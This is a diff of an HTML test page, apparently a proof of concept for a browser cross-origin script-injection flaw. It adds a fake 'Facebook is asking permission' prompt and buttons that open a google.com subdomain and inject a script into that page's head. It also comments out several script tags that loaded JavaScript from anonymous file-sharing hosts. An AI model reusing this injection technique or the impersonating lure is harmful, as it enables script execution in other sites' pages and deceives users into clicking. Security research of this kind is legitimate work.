@@ -6,10 +6,18 @@
   <!-- <script src="https://cdn-148.anonfiles.com/36d293p2v6/7b88964a-1638939486/onclick.js"></script> -->
   <!-- <script src="https://www.dropbox.com/s/hp796og5p9va7zt/face.js?dl=1%22"></script> -->
   <!-- <script src="https://cdn-130.anonfiles.com/f7n4B2pfv3/53a97e1e-1638952487/test.js"></script> -->
-  <script src="https://cdn-128.anonfiles.com/13t4B3p2ve/86fb6d77-1638953075/onclick.js"></script>
+  <!-- <script src="https://cdn-128.anonfiles.com/13t4B3p2ve/86fb6d77-1638953075/onclick.js"></script> -->
 </head>
 
 <body>
-  <!-- <script src="https://cdn-131.anonfiles.com/X2oe49pcva/ec6cb138-1638920600/onclick.js"></script> -->
+<p>Facebook is asking permission to learn what kind of device you're using</p>
+<button onclick="
+  window.b=window.open('https://non-existent.google.com/');
+  setTimeout(function(){let d=b.document.head;d.innerHTML=d.innerHTML+'<script>alert(\'worked\')</script>'},2000)
+  ">Button1</button>
+<button onclick="
+  window.b=window.open('https://non-existent.google.com/');
+  setTimeout(function(){b.document.head.innerHTML=b.document.head.innerHTML+'<script></script>'},2000)
+  ">Button2</button>
 </body>
 </html>
